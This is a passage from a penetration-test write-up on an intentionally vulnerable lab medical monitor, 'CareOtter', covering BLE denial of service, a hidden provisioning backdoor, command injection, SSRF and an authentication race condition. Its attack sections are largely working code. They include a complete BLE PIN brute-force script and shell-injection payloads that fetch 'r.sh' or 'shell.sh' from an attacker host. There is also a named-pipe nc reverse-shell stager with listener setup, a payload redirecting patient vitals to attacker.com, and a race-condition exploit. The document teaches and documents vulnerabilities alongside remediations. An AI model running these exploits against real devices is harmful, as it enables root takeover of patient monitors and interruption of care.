# ZeroDivisionError: float division by zero
# [asyncio] Task exception was never retrieved

# Process remains in memory (silent DoS):
ssh root@192.168.2.1 "ps | grep ble_server"
# → still visible, but no longer emits notifications

# Android app stops updating BPM and SpO2 — frozen screen
```

##### Clinical Impact

In a real DAI (Implantable Automatic Defibrillator) or cardiac monitor device, the loss of BLE notifications means the patient's mobile app stops receiving real-time heart rate and SpO2 data. In ambulatory tele-monitoring scenarios, this silent DoS can delay detection of critical arrhythmias or desaturation episodes, with potentially lethal consequences for the patient.

The deferred nature of the crash (the process responds successfully to the write and only fails 2 seconds later) makes it difficult to correlate the failure with its cause in basic process monitoring systems.

##### Remediation

1. **Validation in `WriteValue`**: Reject the packet if `bpm_max <= bpm_min` before updating `_alert_bpm_window`:

   ```python
   if thresholds["bpm_max"] <= thresholds["bpm_min"]:
       print(f"[BLE] CSCP v1 WriteValue: rejected (invalid window) {thresholds}")
       return
   ```

2. **BLE Authentication**: Require PIN pairing or level 2 authentication (MITM protection) before accepting writes to clinical configuration characteristics.

3. **Asyncio task supervisor**: Wrap critical tasks with `add_done_callback` for automatic restart on uncaught exceptions:

   ```python
   def _restart_on_failure(task: asyncio.Task, coro_factory):
       if not task.cancelled() and task.exception():
           print(f"[BLE] Task crashed, restarting: {task.exception()}")
           new_task = asyncio.create_task(coro_factory())
           new_task.add_done_callback(
               lambda t: _restart_on_failure(t, coro_factory)
           )
   ```

**References:** OWASP IoT Top 10 — I3, I7, I9 · CWE-369 (Divide By Zero) · CWE-703 (Improper Check or Handling of Exceptional Conditions)

---

#### 3.4 Factory Provisioning Channel — Hidden Administrative Backdoor (P1–P8)

##### Description

CareOtter exposes a **secondary GATT service (`0xFF10`)** that is intentionally omitted from the BLE advertising packet. The manufacturer intended this channel for clinical technicians to perform initial bedside-monitor configuration (WiFi SSID/PSK, Cloud API endpoint) before the device has network connectivity. Because it is not listed in `Advertisement.ServiceUUIDs`, the manufacturer assumed it would remain invisible to patients and attackers — a classic "security through obscurity" design.

However, BLE requires every connected client to perform full GATT service discovery. Any standard BLE scanner (nRF Connect, `bluetoothctl`, `gatttool`, or `bleak`) enumerates **all** services after connection, making `0xFF10` trivially discoverable.

The service exposes two characteristics:

| Characteristic | UUID | Flags | Function |
|---|---|---|---|
| Provisioning Config | `0xFF11` | read, write, notify | JSON command interface |
| Provisioning Auth | `0xFF12` | read, write | 4-digit factory PIN |

**Manufacturer claim:** The channel auto-disables 30 minutes after first power-on.  
**Reality (`ble_server.py`):** `initialized_at` is recorded but never compared against `time.time()`. The channel remains active indefinitely (**P8**).

---

##### OWASP Classification

| Category                                 | Role                                                                         |
| ---------------------------------------- | ---------------------------------------------------------------------------- |
| **I3 — Insecure Ecosystem Interfaces**   | Primary — hidden administrative interface reachable over BLE without pairing |
| **I9 — Insecure Default Settings**       | Secondary — hardcoded PIN, no rate limiting, no expiration                   |
| **I6 — Insufficient Privacy Protection** | Tertiary — plaintext PSK disclosure via `ReadValue`                          |
| **I2 — Insecure Network Services**       | Contributing — shell injection and SSRF via provisioning commands            |

---

##### Complete Attack Chain

The following walk-through uses **`bluetoothctl`**, the standard BlueZ interactive client available on any modern Linux distribution.

> **Precondition — set the attacker's BlueZ host to LE-only mode.**
>
> By default `bluetoothd` runs in `dual` mode (BR/EDR + LE). After a successful LE GATT
> connection, `bluetoothctl connect` will additionally attempt to open a classic
> BR/EDR profile (A2DP, AVRCP, HFP, …). Because `CareOtter_HR` is LE-only and exposes
> no classic profile, BlueZ raises
>
> ```text
> Failed to connect: org.bluez.Error.BREDR.ProfileUnavailable
>     No more profiles to connect to
> ```
>
> and tears the LE link down immediately after `ServicesResolved: yes`, before
> the operator can run `menu gatt` / `list-attributes`. This is a well-known
> BlueZ behaviour with LE-only peripherals — **not** a CareOtter vulnerability.
>
> Switch the host adapter to LE-only **once** before starting the chain:
>
> ```bash
> sudo sed -i 's/^#ControllerMode = dual$/ControllerMode = le/' /etc/bluetooth/main.conf
> sudo systemctl restart bluetooth
> ```
>
> After the restart, `bluetoothctl show` should list only `Generic Access`,
> `Generic Attribute` and `Device Information` UUIDs — every BR/EDR UUID
> (`A/V Remote Control`, `Audio Sink`, `Handsfree Audio Gateway`, …) must be
> gone. Revert with `ControllerMode = dual` if you later need classic Bluetooth
> on the same host (audio headsets, etc.).
>
> Alternatives that bypass this entirely without touching `main.conf`: use
> [`bleak`](https://github.com/hbldh/bleak) (LE-pure Python) or `gatttool -t random`
> (deprecated but still LE-only).

**Step 1 — Connect and enumerate GATT services (P1)**

> **Prerequisite — lower the BlueZ discovery filter before `scan on`.**
>
> BlueZ default `DiscoveryFilter` rejects adv reports below ≈−80 dBm and collapses
> duplicate packets. The Pi BCM4345C0 with PCB antenna typically arrives at −85 dBm
> in the lab, so `bluetoothctl` shows nothing even when `sudo btmon` already sees
> `Name (complete): CareOtter_HR` at the HCI layer. Set a permissive filter once
> per session before scanning:
>
> ```text
> bluetoothctl
> [bluetooth]# menu scan
> [bluetooth]# transport le
> [bluetooth]# rssi -100
> [bluetooth]# duplicate-data on
> [bluetooth]# pattern CareOtter
> [bluetooth]# back
> [bluetooth]# scan on
> ```
>
> After `[NEW] Device 43:45:C0:00:1F:AC CareOtter_HR` appears, `scan off` and
> continue with `connect`.

```bash
$ bluetoothctl
[bluetooth]# connect 43:45:C0:00:1F:AC
Attempting to connect to 43:45:C0:00:1F:AC
Connection successful
[CareOtter_HR]# menu gatt
Menu gatt:
...
[CareOtter_HR]# list-attributes
```

`list-attributes` reveals a **Secondary Service** that was never advertised:

![[ble-08-unknown-characteristics.png]]

The hidden provisioning service (`0xFF10`) and its two characteristics (`0xFF11`, `0xFF12`) are fully visible to any connected client.

---

**Step 2 — Probe the gated config + read the auth status (P3)**

Select the Config characteristic (`0xFF11` / `char0044`) and read its current value:

![[hidden-backdoor-pin-required.png]]

```bash
[CareOtter_HR]# select-attribute /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0044
[CareOtter_HR:/service0043/char0044]# read
Attempting to read /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0044
[CHG] Attribute ... Value:
  7b 22 65 72 72 6f 72 22 3a 20 22 50 49 4e 5f 52  {"error": "PIN_R
  45 51 55 49 52 45 44 22 7d                       EQUIRED"}
```

The response decodes to:
```json
{"error": "PIN_REQUIRED"}
```

`ProvisioningConfigChrc.ReadValue` is gated on `_provisioning_state["authenticated"]` — until the PIN has been verified in Step 3, the read returns this stub instead of the provisioning state. The server simultaneously logs `[BLE] Provisioning read rejected — PIN not verified`. The plaintext `wifi_ssid` / `wifi_psk` / `cloud_url` (P5, CWE-312) is *not* leaked pre-PIN; it surfaces in Step 5 below once the gate is open.

Now read the Auth characteristic (`0xFF12` / `char0047`) — this one is **not** gated, by design, so an attacker can observe the brute-force counter:

```bash
[CareOtter_HR:/service0043/char0044]# select-attribute /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0047
[CareOtter_HR:/service0043/char0047]# read
Attempting to read /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0047
[CHG] Attribute ... Value:
  7b 22 61 74 74 65 6d 70 74 73 5f 72 65 6d 61 69  {"attempts_remai
  6e 69 6e 67 22 3a 20 33 2c 20 22 6c 6f 63 6b 65  ning": 3, "locke
  64 22 3a 20 66 61 6c 73 65 7d                    d": false}
```

Decoded:
```json
{"attempts_remaining":3, "locked":false}
```

The device exposes a **guess counter with no permanent lockout mechanism** (`locked: false`). An attacker can brute-force the 4-digit PIN indefinitely — the counter just rolls over.

---

**Step 3 — Bypass authentication (P2, P3) — MANDATORY before any 0xFF11 write**

No BLE pairing or bonding is required. The factory PIN is hardcoded to `6767` across all devices (4 ASCII digits → `0x36 0x37 0x36 0x37`). Write it to `0xFF12`:

```bash
[CareOtter_HR:/service0043/char0047]# write "0x36 0x37 0x36 0x37"
```

After the write, re-`read` the same characteristic to confirm acceptance — on a correct PIN the server resets `pin_attempts=0` internally, so the displayed `attempts_remaining` returns to `3`:

```bash
[CareOtter_HR:/service0043/char0047]# read
# {"attempts_remaining": 3, "locked": false}
```

###### Brute force — when the PIN has not been pre-extracted from firmware

If the attacker has no firmware access, the 10 000-PIN space is fully sweepable from BLE range because `ProvisioningAuthChrc.WriteValue` accepts every attempt regardless of the counter — `locked` is a hardcoded literal `False` and the displayed `attempts_remaining` is the cyclic expression `max(0, 3 - (pin_attempts % 3))`, which hides the real attempt count from the client (CWE-358).

The following `bleak` script iterates `0000..9999` writing each candidate to `0xFF12`. Success detection is delegated to an out-of-band SSH watcher on the device log because the BLE-side `Value`/`ReadValue` carry **no observable indicator** that a client can distinguish from the modulo collision at every third failure:

```python
#!/usr/bin/env python3
"""CareOtter PIN brute force via bleak.

Iterates 0000..9999, writing each candidate to the Provisioning Auth
characteristic (0xFF12). Detection: an external watcher tails
/var/log/ble_server.log on the device over SSH and writes the matched line
to /tmp/careotter_pin_found; this script polls that sentinel file and
stops as soon as it is non-empty.

Empirical run on the lab: PIN 6767 reached in attempt #6768 in ~10 min.
"""
import asyncio
import os
import sys
import time

from bleak import BleakClient

TARGET    = "43:45:C0:00:1F:AC"
AUTH_UUID = "0000ff12-0000-1000-8000-00805f9b34fb"
SIGNAL    = "/tmp/careotter_pin_found"


async def brute():
    async with BleakClient(TARGET, timeout=20.0) as c:
        # Resolve the auth char by exact object reference rather than UUID
        # to avoid "Multiple Characteristics with this UUID" when stale
        # ble_server.py instances are still registered in BlueZ.
        auth_chr = None
        for svc in c.services:
            for ch in svc.characteristics:
                if ch.uuid == AUTH_UUID:
                    auth_chr = ch
                    break
            if auth_chr:
                break
        if auth_chr is None:
            print("[-] auth char not found"); return
        print(f"[+] Connected. Auth char: handle={auth_chr.handle}")

        start = time.perf_counter()
        for n in range(10_000):
            pin = f"{n:04d}"
            try:
                await c.write_gatt_char(auth_chr, pin.encode(), response=True)
            except Exception as e:
                print(f"[-] write failed at {pin}: {e}")
                await asyncio.sleep(0.1)
                continue

            if os.path.exists(SIGNAL) and os.path.getsize(SIGNAL) > 0:
                with open(SIGNAL) as f:
                    print(f"[+] Signal: {f.read().strip()}")
                print(f"[+] Last PIN written: {pin}")
                elapsed = time.perf_counter() - start
                print(f"[+] {n+1} attempts in {elapsed:.1f}s "
                      f"({(n+1)/elapsed:.1f}/s)")
                return

            if n % 200 == 0 and n > 0:
                elapsed = time.perf_counter() - start
                rate = n / elapsed
                eta = (10000 - n) / rate
                print(f"[*] {pin}  rate={rate:.1f}/s  eta={eta:.0f}s")

        print("[-] Exhausted 10 000 PINs without success")


if __name__ == "__main__":
    try:
        asyncio.run(brute())
    except KeyboardInterrupt:
        sys.exit(1)
```

Run the script together with the SSH watcher that creates the sentinel:

```bash
# 1) Watcher: tails the device log, fills the sentinel on AUTH success
rm -f /tmp/careotter_pin_found
( ssh root@192.168.2.1 \
    "tail -n0 -F /var/log/ble_server.log | grep --line-buffered -m1 'AUTH success'" \
    > /tmp/careotter_pin_found ) &

# 2) Brute force in the foreground
python3 careotter_pin_brute.py
```

**Empirical timeline observed on the lab** (Cypress BCM43430 on the Pi + bleak + BlueZ 5.x on Kali):

```
line   25:  [BLE] Provisioning AUTH failed (PIN=0000, attempts=1)      ← start
line 6850:  [BLE] Provisioning AUTH failed (PIN=6764, attempts=6765)
line 6851:  [BLE] Provisioning AUTH failed (PIN=6765, attempts=6766)
line 6852:  [BLE] Provisioning AUTH failed (PIN=6766, attempts=6767)   ← last failure
line 6853:  [BLE] Provisioning AUTH success                            ← PIN=6767 accepted
line 6854:  [BLE] Provisioning AUTH failed (PIN=6768, attempts=1)      ← server reset confirmed
```

**6 767 failed writes** were accepted by `WriteValue` before the correct PIN, **zero** were rejected by the (decorative) attempts counter, and the counter reset to `1` on the very next failed write — proving the only state mutation the server performs on success is `pin_attempts = 0`. Wall-clock cost: ~10 min on this rig (~11 writes/s). On a faster radio + adapter combination this collapses to ~100 s worst case for the entire 10 000 space.

---

`ProvisioningConfigChrc.WriteValue` now enforces this gate strictly: it checks `_provisioning_state["authenticated"]` at entry and silently drops any command (logging `"[BLE] Provisioning command rejected — PIN not verified"`) until a correct PIN write has flipped that flag to `True`. **Steps 4, 5 and 6 below all depend on Step 3 having succeeded first.**

The PIN gate is **not** what makes this exploitable — the underlying weaknesses are:

| Weakness                                                                                                                                                                          | Consequence                                                                                                                                                                                               |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CWE-798** — PIN hardcoded factory-wide (`PROV_PIN_FACTORY = "6767"`, identical on every device)                                                                                 | `strings /opt/medical-sensor/ble_server.py \| grep PROV_PIN_FACTORY` recovers it; one write bypasses the gate.                                                                                            |
| **CWE-307** — `ProvisioningAuthChrc` counts failed attempts but **never permanently locks**; the counter only modulates the JSON `attempts_remaining` field and resets on success | If the PIN were not already public, the entire 4-digit space (10 000 combinations × ~10 ms BLE latency ≈ 100 s worst-case) is fully brute-forceable from BLE range with no observable defensive response. |
| **CWE-613** — `_provisioning_state["authenticated"]` never auto-clears (P8 unchanged)                                                                                             | Once true, it stays true until the BLE service restarts, so a single successful PIN write keeps the gate open indefinitely for the rest of the chain.                                                     |

After this step, the attacker holds `authenticated=True` and every subsequent 0xFF11 write executes.

---

**Step 4 — Remote Code Execution via shell injection (P4)** — *requires Step 3*

The `wifi_set` command in `ble_server.py` interpolates SSID and PSK directly into an `os.system()` call without escaping shell metacharacters:

```python
os.system(f"uci set wireless.@wifi-iface[0].ssid='{ssid}' && ...")
```

Prepare the malicious payload:

```bash
$ PAYLOAD='{"cmd":"wifi_set","ssid":"'\''; curl http://attacker/r.sh | sh #","psk":"x"}'
$ HEX=$(echo -n "$PAYLOAD" | xxd -ps)
$ echo "$HEX"
7b22636d64223a22776966695f736574222c2273736964223a22...
$ echo "$HEX" | sed 's/../0x& /g; s/ $//'| tr -d '\n'
```

`r.sh` example:
```bash
#!/bin/ash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.2 9001 > /tmp/f
```

Write it to `0xFF11` (char0044):

```bash
[CareOtter_HR:/service0043/char0047]# select-attribute /org/bluez/hci0/dev_43_45_C0_00_1F_AC/service0043/char0044
[CareOtter_HR:/service0043/char0044]# write 0x7b 0x22 ...   # full hex string of payload
```

This executes as **root** on the bedside monitor:

```bash
uci set wireless.@wifi-iface[0].ssid=''; curl http://attacker/r.sh | sh #' && ...
```

##### Attacker-side setup — verifying remote code execution

The `r.sh` referenced in the payload is a one-line reverse-shell stager hosted on
the attacker's machine. The goal is to **prove** the injection ran by getting an
interactive root shell from the Pi back to the attacker — no clinical effect on
the device, just a TCP callback.

**1. On the attacker's host, create `r.sh`:**

```bash
cat > /tmp/r.sh <<'EOF'
#!/bin/sh
# Reverse shell back to the attacker.
# 192.168.2.100 = attacker, 4444 = listener port. Adjust to your lab subnet.
ATTACKER_IP=192.168.2.100
ATTACKER_PORT=4444

# OpenWRT ships BusyBox `nc` which does NOT support `-e`. The portable
# trick is a named-pipe loop that wires /bin/sh's stdio to a TCP socket.
mkfifo /tmp/.f 2>/dev/null
cat /tmp/.f | /bin/sh -i 2>&1 | nc "$ATTACKER_IP" "$ATTACKER_PORT" > /tmp/.f
rm -f /tmp/.f

# Side-evidence: also drop a marker file so you can confirm execution even
# if the reverse shell is blocked by the firewall hook (75-firewall.sh).
echo "pwned by $(id) at $(date)" > /tmp/careotter_rce_marker
EOF
chmod +x /tmp/r.sh
```

**2. Serve `r.sh` on a plain HTTP server reachable from the Pi:**

```bash
cd /tmp && python3 -m http.server 80
# Serving HTTP on 0.0.0.0 port 80 ...
```

**3. Open the listener that will catch the reverse shell:**

```bash
# In a separate terminal on the attacker host
nc -lvnp 4444
# listening on [any] 4444 ...
```

**4. Trigger the BLE write from Step 4 above** — the SSID field interpolates
`'; curl http://192.168.2.100/r.sh | sh #` into `os.system()`, the Pi fetches and
executes `r.sh` as **root**, and:

- The Python HTTP server logs `192.168.2.1 - - [..] "GET /r.sh HTTP/1.1" 200 …` →
  confirms the Pi reached out and downloaded the stager.
- The `nc -lvnp 4444` window prints `connect to [192.168.2.100] from … 192.168.2.1`
  and drops you into a `#` prompt running as root on the bedside monitor.

**5. Verify on the reverse shell:**

```sh
# On the catched shell
id
# uid=0(root) gid=0(root) groups=0(root)

uname -a
# Linux OpenWrt 6.6.x ... aarch64 GNU/Linux

cat /tmp/careotter_rce_marker
# pwned by uid=0(root) gid=0(root) groups=0(root) at Mon May 13 ...

# Reach the careservice admin port from inside the device — no auth needed now
nc -w1 127.0.0.1 9999 < /dev/null
```

> **If the reverse shell fails to connect but `/tmp/careotter_rce_marker` exists
> on the Pi**, the injection itself succeeded — the failure is purely network
> reachability (typically the `75-firewall.sh` hook on the Pi or NAT between the
> two hosts). In that case, validate RCE by reading the marker out-of-band:
> `ssh root@192.168.2.1 'cat /tmp/careotter_rce_marker'`. The marker is the
> minimal, firewall-independent proof that arbitrary code ran as root via the
> BLE provisioning channel.

---

**Step 4b — Re-read 0xFF11 post-PIN: plaintext PSK leak (P5)** — *requires Step 3*

Repeating the `read` from Step 2 now returns the **real** provisioning state instead of the `PIN_REQUIRED` stub. The PSK still travels in cleartext (CWE-312 — Plaintext Storage of Sensitive Information):

```bash
[CareOtter_HR:/service0043/char0044]# read
[CHG] Attribute ... Value:
  7b 22 77 69 66 69 5f 73 73 69 64 22 3a 20 22 22  {"wifi_ssid": ""
  2c 20 22 77 69 66 69 5f 70 73 6b 22 3a 20 22 22  , "wifi_psk": ""
  2c 20 22 63 6c 6f 75 64 5f 75 72 6c 22 3a 20 22  , "cloud_url": "
  68 74 74 70 3a 2f 2f 31 39 32 2e 31 36 38 2e 32  http://192.168.2
  2e 32 3a 35 30 30 32 22 2c 20 22 75 70 74 69 6d  .2:5002", "uptim
  65 5f 73 65 63 22 3a 20 33 33 30 37 2c 20 22 70  e_sec": 3307, "p
  72 6f 76 69 73 69 6f 6e 5f 65 78 70 69 72 65 64  rovision_expired
  22 3a 20 66 61 6c 73 65 7d                       ": false}
```

Decoded:
```json
{"wifi_ssid":"", "wifi_psk":"",
 "cloud_url":"not_configured",
 "uptime_sec":3307, "provision_expired":false}
```

On a fresh, unprovisioned device the Cloud API URL reads **`not_configured`** — the monitor has **no backend yet** and is waiting for a technician to inject one. Instead of merely eavesdropping on an existing cloud session, the attacker can **become the cloud** by writing their own URL via `cloud_set` (Step 5) — the Android app will then send patient vitals and administrative commands to the attacker's server. On a previously provisioned device the read additionally leaks the hospital `wifi_psk` in cleartext (BLE-10).

---

**Step 5 — SSRF / Data exfiltration redirection (P6)** — *requires Step 3*

The `cloud_set` command accepts any URL without validation. An attacker can redirect all future patient vitals and device telemetry to an attacker-controlled server:

```bash
$ PAYLOAD='{"cmd":"cloud_set","url":"http://attacker.com:8080"}'
$ HEX=$(echo -n "$PAYLOAD" | xxd -ps)
[CareOtter_HR:/service0043/char0044]# write 0x7b 0x22 ...   # hex of cloud_set payload
```

The Cloud API bridge (`app.py`) forwards IGP commands to this new URL, giving the attacker a live feed of patient data and administrative commands.

---

**Step 6 — Factory reset gated only by the factory PIN (P7)** — *requires Step 3*

Once the PIN gate has been passed in Step 3, a single write to `0xFF11` with `factory_reset` wipes the device configuration and reboots the WiFi stack, causing a clinical service interruption:

```bash
[CareOtter_HR:/service0043/char0044]# write 0x7b 0x22 0x63 0x6d 0x64 0x22 0x3a 0x22 0x66 0x61 0x63 0x74 0x6f 0x72 0x79 0x5f 0x72 0x65 0x73 0x65 0x74 0x22 0x7d
```

(Or generate with `echo -n '{"cmd":"factory_reset"}' | xxd -ps` → `7b22636d64223a22666163746f72795f7265736574227d`)

What makes this a P7-class flaw — even with the PIN gate active — is the **complete absence of a second confirmation factor on a destructive operation**: no physical button press, no admin re-authentication over the Cloud API, no time-delayed confirmation prompt. The **same** low-entropy factory PIN that gates `wifi_set` and `cloud_set` is also sufficient to permanently wipe patient configuration. Real medical devices typically require an additional out-of-band confirmation (hardware tamper switch, dual-operator approval, or a TLS-authenticated admin command from the hospital backend) for any reset that takes the monitor offline; CareOtter requires none.

Negative control — verifies the gate is active and Step 3 is mandatory:

```bash
# Reconnect from a fresh BLE session (or after `ble-server restart`) so the
# `authenticated` flag is False, then write factory_reset WITHOUT writing the PIN:
[CareOtter_HR:/service0043/char0044]# write 0x7b 0x22 0x63 0x6d 0x64 0x22 0x3a 0x22 0x66 0x61 0x63 0x74 0x6f 0x72 0x79 0x5f 0x72 0x65 0x73 0x65 0x74 0x22 0x7d

# On the Pi:
logread -e BLE | tail -1
# →  "[BLE] Provisioning command rejected — PIN not verified"
# The configuration is intact; the device does NOT reboot.
```

---

##### Clinical Impact

The Factory Provisioning Channel transforms a **transient proximity attack** (Bluetooth range) into **full device compromise**:

| Stage | Consequence | Patient Safety Risk |
|-------|-------------|---------------------|
| P5 — WiFi PSK leak / unprovisioned state | Attacker joins hospital WiFi OR discovers device has no backend yet | High — network breach OR attacker becomes the cloud |
| P6 — Cloud URL injection + signature capture | Attacker-supplied backend receives factory signature + admin creds; replays to real cloud → permanent admin takeover | Critical — complete backend compromise |
| P4 — Shell injection | Root RCE on bedside monitor | Critical — device takeover |
| P7 — Factory reset gated only by hardcoded PIN | Monitor goes offline; alerts stop; nurses lose telemetry. Trivially reached via Step 3 once the PIN is known or brute-forced | Critical — silent care interruption |

### Chain F — Cloud API Impersonation via Signature Interception

This chain exploits the hidden BLE Factory Provisioning Service (`0xFF10`) to redirect the device's backend to an attacker-controlled server, capture the hardcoded factory signature, and replay it to the real Cloud API for permanent admin takeover. It requires only Bluetooth range and completes in under three minutes.

**Prerequisites:** Bluetooth range (~10–30 m). No pairing, no network access, no IGP token.  
**Execution time:** < 3 minutes with a smartphone.  
**Impact:** Complete backend takeover (admin account) + root RCE + patient data exfiltration.

> **For the full step-by-step playbook with concrete commands, payloads, and timelines, see [`Attack_Playbook.md`](../Attack_Playbook.md#chain-f--cloud-api-impersonation-via-signature-interception).**

---

##### Remediation

1. **Remove the provisioning service from production builds.** The service should only exist in factory-flash firmware and be stripped before devices ship to clinics.

2. **If retention is mandatory**, gate the service behind **LE Secure Connections pairing** (Level 4 — MITM protection with authenticated pairing) rather than a static PIN:

   ```python
   # BlueZ agent requirement
   # Pairing must use Passkey Entry with a per-device, randomized PIN
   # printed on the device label — not a global factory default.
   ```

3. **Implement the claimed 30-minute auto-expiry.** Check elapsed time on every `ReadValue` / `WriteValue`:

   ```python
   PROVISIONING_WINDOW_SEC = 30 * 60

   def _is_provisioning_expired() -> bool:
       elapsed = time.time() - _provisioning_state["initialized_at"]
       return elapsed > PROVISIONING_WINDOW_SEC
   ```

4. **Sanitize all provisioning inputs.** Use `subprocess.run()` with a list argument instead of `os.system()` with string interpolation:

   ```python
   import subprocess
   subprocess.run([
       "uci", "set", f"wireless.@wifi-iface[0].ssid={ssid}"
   ], check=True)
   ```

5. **Validate the Cloud API URL.** Restrict `cloud_set` to a whitelist of trusted domains or certificate-pinned endpoints.

6. **Require physical confirmation for factory reset.** A reset should demand simultaneous press of a hardware button on the device **or** an authenticated admin command over the encrypted Cloud API — never a single BLE write.

**References:** OWASP IoT Top 10 — I2, I3, I6, I9 · CWE-200 (Information Exposure) · CWE-306 (Missing Authentication) · CWE-307 (Improper Restriction of Excessive Authentication Attempts) · CWE-798 (Hardcoded Credentials) · CWE-78 (OS Command Injection) · CWE-912 (Hidden Functionality)

---

### IoT:I4 — Lack of Secure Update Mechanism

The `careservice` binary is deployed as a pre-compiled ELF for aarch64-cortex-a53 without any integrity verification mechanism. There is no signature check on the binary at startup, no secure boot chain, and no protection against replacement via the filesystem. An attacker who gains write access to `/opt/careotter/` can substitute the binary with a trojanized version that persists across service restarts.

**References:** OWASP IoT Top 10 — I4

---

### IoT:I6 — Insufficient Privacy Protection

#### 6.1 WiFi PSK disclosure via IGP GET_NETWORK

After authenticating with the hardcoded token, command `0x03` returns the raw contents of `/etc/config/wireless`, which includes the WiFi PSK in plaintext:

```bash
$ python3 -c "
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999)) as s:
        s.sendall(h + p); return s.recv(4096)
igp(0x02, b'OtterMobile2026')
print(igp(0x03).decode())
"
config wifi-device 'radio0'
    ...
config wifi-iface 'default_radio0'
    option ssid 'HomeNetwork'
    option key 'mypassword123'
    ...
```

The WiFi PSK also appears in the Cloud API response at `GET /api/network` in the `raw` field when `VULNERABLE=1`.

**References:** OWASP IoT Top 10 — I6 · CWE-312

---

### IoT:I7 — Insecure Data Transfer and Storage

#### 7.1 Global authentication state persists between TCP connections

The `authenticated` variable in `careservice.c` is a global integer initialized to zero at process startup. It is never reset when a connection closes:

```c
/* careservice.c:35 */
int authenticated = 0;
```

Once any client sends `0x02` with the correct token, all subsequent connections — including those from different hosts — inherit the authenticated state until the daemon is restarted. This means an attacker can authenticate and then a separate, unrelated client immediately has admin access without supplying credentials.

**References:** OWASP IoT Top 10 — I7 · CWE-613 — Insufficient Session Expiration

---

#### 7.2 Authentication State Race Condition

**Type:** CWE-362 — Concurrent Execution using Shared Resource with Improper Synchronization  
**Prerequisite:** CWE-613 (§7.1) — `authenticated` is process-global, not connection-scoped  
**OWASP IoT Top 10:** I7 (primary) · I2 (insecure network service)  
**Severity:** High

##### Description

When a legitimate client implements the auth → cmd → deauth mitigation pattern (IGP `0x02` → command → IGP `0x0D`), careservice necessarily opens a **privilege window** spanning three independent TCP connections. Any attacker with network access to port 9999 can insert a privileged IGP command during this window **without supplying any credentials**.

The window exists because the `authenticated` flag is process-global (`careservice.c:35`) and each IGP command uses a separate TCP connection — the server closes the socket after each response. No lock or mutex at the client side (Cloud API or mobile app) can prevent an external TCP client from inserting between connection 1 (auth) and connection 3 (deauth).

This is distinct from IoT:I7.1: that vulnerability requires the attacker to know the token and authenticate themselves. This race condition requires **zero credentials** — it parasitizes the legitimate admin's authentication.

##### Attack Timeline

```
[Legitimate admin action — e.g. POST /api/network or "WiFi Config" in mobile app]

t+ 0ms  TCP conn 1  →  IGP 0x02 AUTHENTICATE  →  authenticated = 1
        ┌──────────────────────────────────────────────────────────────────┐
        │  PRIVILEGE WINDOW                                                │
        │  Any TCP client on :9999 executes protected commands            │
        │  without credentials. Duration: ~2–50 ms (one network RTT).    │
        └──────────────────────────────────────────────────────────────────┘
t+Xms  TCP conn 2  →  IGP 0x03 GET_NETWORK  →  command executed (admin)
t+Yms  TCP conn 3  →  IGP 0x0D DEAUTHENTICATE  →  authenticated = 0

Attacker (no token required):
  Monitoring :9999 for incoming SYN from admin client...
  On SYN detected → immediately send IGP 0x06:

  IGP 0x06 payload: "' && curl http://attacker/shell.sh | sh #|x"
  → RCE as root on the Raspberry Pi
```

##### Conditions Required

| Condition | Required | Notes |
|-----------|:--------:|-------|
| Network access to `192.168.2.1:9999` | ✓ | Any host on `192.168.2.0/24` or LAN |
| IGP token `OtterMobile2026` | **✗** | Not needed — relies on victim's auth |
| Admin performs a protected action | ✓ | Cloud API call or mobile app button tap |
| IGP protocol knowledge | ✓ | Documented in firmware source; trivially extracted |

##### Exploit Proof-of-Concept

The attacker monitors port 9999 and fires a privileged command the moment they detect an incoming admin connection:

```python
import socket, struct, threading

MAGIC = 0x43415245

def igp_inject(cmd, payload=b''):
    """Send a privileged IGP command without authenticating."""
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection(('192.168.2.1', 9999), timeout=1) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)

def monitor_and_inject():
    """Wait for admin activity on :9999, then inject a shell command."""
    # Step 1: detect auth window (poll until 0x06 is accepted without RESTRICTED)
    while True:
        try:
            resp = igp_inject(0x06, b"injected_ssid'; touch /tmp/race_pwned #|x")
            if b'WIFI_UPDATED' in resp or b'WIFI_ERR' in resp:
                print("[+] Race window hit — command executed:", resp)
                break
            # b'RESTRICTED' → window not open yet, retry
        except Exception:
            pass

threading.Thread(target=monitor_and_inject, daemon=True).start()
print("[*] Waiting for admin to trigger any protected action on the device...")
```

##### Difference from IoT:I7.1

| | IoT:I7.1 — Global Auth State Persistence | IoT:I7.2 — Auth State Race Condition |
|-|------------------------------------------|--------------------------------------|
| Attacker needs token | Yes (to set `authenticated=1`) | **No** (relies on victim's auth) |
| Concurrent admin activity required | No (state persists indefinitely) | Yes (timing-dependent) |
| Window duration | Indefinite until process restart | ~2–50 ms per admin action |
| Mitigated by IGP 0x0D DEAUTHENTICATE | Partially — reduces window to ms | **No** — window still exists |
| Mitigated by client-side Lock | N/A | No — only serializes API clients |

##### Root Cause in `careservice.c`

```c
/* careservice.c:35 — root cause: global auth state, not per connection */
int authenticated = 0;

/* main() loop — each connection inherits the process-global state */
while (1) {
    int c_fd = accept(s_fd, NULL, NULL);  /* new TCP connection */
    handle_request(c_fd);                 /* reads ONE command, responds */
    close(c_fd);                          /* close socket — authenticated is NOT reset */
}
```

The architectural fix requires scoping `authenticated` to the connection descriptor, not the process. Moving the declaration inside `handle_request()` would isolate each TCP connection:

```c
void handle_request(int c_fd) {
    int authenticated = 0;  /* scoped to this connection — each client starts unauthenticated */
    /* ... */
}
```

This would eliminate both IoT:I7.1 and IoT:I7.2 simultaneously, but is intentionally left unfixed in the lab.

**References:** CWE-362 · CWE-613 · OWASP IoT Top 10 — I7 · ETSI EN 303 645 §5.5

---

### IoT:I8 — Lack of Device Management

#### 8.1 Zombie process accumulation (REBOOT_SERVICE)

Command `0x09` forks a child process to restart a service but never calls `waitpid()`:

```c
pid_t pid = fork();
if (pid == 0) {
    execv(svc_path, argv);
    _exit(1);
